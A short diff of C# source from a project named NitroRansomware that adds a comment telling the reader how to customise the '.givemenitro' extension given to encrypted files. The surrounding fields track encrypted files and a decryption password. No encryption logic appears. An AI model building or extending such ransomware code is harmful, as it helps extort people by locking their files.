@@ -9,7 +9,7 @@ namespace NitroRansomware
     {
         public static int encryptedCount = 0;
         private static Logs logging = new Logs("DEBUG", 0);
-        private static string fExtension = ".givemenitro";
+        private static string fExtension = ".givemenitro"; //here you can customize the extension that goes in the file name where it get encrypted
         public static string fPassword = Program.DECRYPT_PASSWORD;
         public static string inPassword;
         public static List<string> encryptedFileLog = new List<string>();
